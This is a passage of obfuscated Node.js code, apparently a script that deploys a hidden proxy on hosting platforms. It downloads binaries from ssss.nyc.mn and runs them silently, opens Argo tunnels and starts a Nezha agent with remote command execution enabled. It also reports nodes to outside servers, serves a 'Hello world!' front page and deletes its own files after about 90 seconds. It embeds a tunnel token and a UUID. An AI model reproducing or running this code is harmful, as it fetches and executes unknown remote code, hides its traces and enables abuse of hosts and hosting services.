_0x1fcbb4&&_0x1fcbb4[_0x2add5d(0x196)]===0xc8?(console[_0x2add5d(_0x11f879._0x301948)]('Nodes\x20uploaded\x20successfully'),_0x1fcbb4):null;}catch(_0x6e8c44){return null;}}else return;}}function cleanFiles(){const _0x502941={_0x561f40:0x129,_0x2a96a8:0x172,_0x3edc3a:0x137,_0x3b110b:0x19c,_0x19669d:0x1bc,_0x2d1765:0x19c},_0x148e47={_0x5f5b72:0x1b1,_0x29096d:0x1b3};setTimeout(()=>{const _0x52ec52={_0x4c0f37:0x1b1,_0x3dd6e5:0x1b3},_0x437a58=_0x450c,_0x2a2c67=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2a2c67['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2a2c67[_0x437a58(_0x502941._0x561f40)](phpPath);process[_0x437a58(_0x502941._0x2a96a8)]===_0x437a58(_0x502941._0x3edc3a)?exec(_0x437a58(0x130)+_0x2a2c67[_0x437a58(_0x502941._0x3b110b)]('\x20')+_0x437a58(_0x502941._0x19669d),_0x1b3a30=>{const _0x94d651=_0x437a58;console[_0x94d651(_0x52ec52._0x4c0f37)](),console[_0x94d651(0x1b3)](_0x94d651(0x16b)),console[_0x94d651(_0x52ec52._0x3dd6e5)](_0x94d651(0x194));}):exec(_0x437a58(0x1ab)+_0x2a2c67[_0x437a58(_0x502941._0x2d1765)]('\x20')+_0x437a58(0x125),_0x313184=>{const _0x4cf8e8=_0x437a58;console[_0x4cf8e8(_0x148e47._0x5f5b72)](),console['log'](_0x4cf8e8(0x16b)),console[_0x4cf8e8(_0x148e47._0x29096d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x878945=_0x1fcea9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x878945(0x1b3)](_0x878945(0x1b4));return;}try{const _0x2e8077=await axios[_0x878945(0x11a)](_0x878945(0x19a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x878945(0x18e)}});return console[_0x878945(0x1b3)](_0x878945(0x176)),_0x2e8077;}catch(_0x5153a9){return console[_0x878945(0x173)](_0x878945(0x124)+_0x5153a9['message']),null;}}async function startserver(){const _0xedfae2={_0xb00939:0x173},_0x1880b6=_0x1fcea9;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x27fe8d){console[_0x1880b6(_0xedfae2._0xb00939)]('Error\x20in\x20startserver:',_0x27fe8d);}}function _0x50e3(){const _0x5726de=['isFile','UPLOAD_URL','\x20-s\x20','pkill\x20-f\x20\x22[','\x20is\x20created','tls','catch','block','7a54e22e-2f9f-4649-80a2-3103dcaede68','https://amd64.ssss.nyc.mn/web','NEZHA_KEY','from','northflank','child_process','?security=tls&sni=','/vless-argo','unlinkSync','https://amd64.ssss.nyc.mn/bot','floor','https://amd64.ssss.nyc.mn/agent','application/json','https://arm64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','length','/api/add-nodes','writeFileSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','status','unshift','997185JHeaxB','\x22\x20>\x20/dev/null\x202>&1','https://oooo.serv00.net/add-url','847392PRcUcH','join','xtls-rprx-vision','2087','get','statSync','&path=%2Ftrojan-argo%3Fed%3D2560#','success','http','443','includes','tcp','existsSync','SUB_PATH','2083','path','rm\x20-rf\x20','\x20>/dev/null\x202>&1\x20&','express','NAME','createWriteStream','unlink','clear','country_code','log','Skipping\x20adding\x20automatic\x20access\x20task','/dev/null','eyJhIjoiOTIxNjUyYjg0YmQwMDgwNDRiODBkNjM0ODRmOGVjZjEiLCJ0IjoiZjhjMzlkYTYtZWVkYi00OTJmLWFiYTQtMWViMWM2YmJmNjJiIiwicyI6Ik5EQmlNRFUzWTJFdFpHSTRNUzAwTVdOaExUa3dOemN0TVdJME1UWTBaRGMxTVdGbSJ9','close','11038xZGGTm','amd','2096','CFPORT','\x20>\x20nul\x202>&1','Download\x20','map','\x0a\x20\x20credentials-file:\x20','filter','message','random','finish','pipe','2053','40536OdlwlE','freedom','\x0aclient_secret:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','341957jyIDgA','\x20successfully','UUID','chmod','Unknown','.exe\x20>\x20nul\x202>&1','\x20-c\x20','boot.log','false','AUTO_ACCESS','tunnel.yml','aarch64','vless','ArgoDomain:','arm64','&path=%2Fvless-argo%3Fed%3D2560#','countryCode','SERVER_PORT','ARGO_DOMAIN','1264AERqkd','vmess','config.json','data','post','https://ipapi.co/json/','env','test','basename','PORT','utf-8','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','127.0.0.1','FILE_PATH','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20>/dev/null\x202>&1','?encryption=none&security=tls&sni=','4FAdVvH','16597405hLGeNz','push','\x20is\x20running','match','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/config.json\x20>/dev/null\x202>&1\x20&','axios','blackhole','del\x20/f\x20/q\x20','base64','tunnel.json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','6514780eHyOsZ','Subscription\x20uploaded\x20successfully','win32','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/tunnel.yml\x20run','\x20already\x20exists','true','nohup\x20','npm\x20running\x20error:\x20','8443','config.yaml','Unhandled\x20error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','org','none','./tmp','Hello\x20world!','158PVkrRY','/trojan-argo','mkdirSync','CFIP','198bTZkyd','PROJECT_URL','--tls','arch','forEach','arm','\x0a\x0avmess://','trojan','stringify','Error\x20reading\x20boot.log:','http\x20server\x20is\x20running\x20on\x20port:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','Empowerment\x20failed\x20for\x20','send','\x0a\x0atrojan://','/vmess-argo','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','then','text/plain;\x20charset=utf-8','\x20failed:\x20','php\x20running\x20error:\x20','\x0a\x20\x20tunnel:\x20','toString','https://arm64.ssss.nyc.mn/bot','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','stream','ARGO_PORT','direct','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','App\x20is\x20running','Content-Type','\x0avless://','sub','taskkill\x20/f\x20/im\x20','NEZHA_SERVER','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','platform','error','readFileSync','/vmess-argo?ed=2560','automatic\x20access\x20task\x20added\x20successfully','charAt','split','quic'];_0x50e3=function(){return _0x5726de;};return _0x50e3();}startserver()['catch'](_0x28b842=>{const _0x2dd124=_0x1fcea9;console[_0x2dd124(0x173)](_0x2dd124(0x142),_0x28b842);}),app['listen'](PORT,()=>console[_0x1fcea9(0x1b3)](_0x1fcea9(0x156)+PORT+'!'));
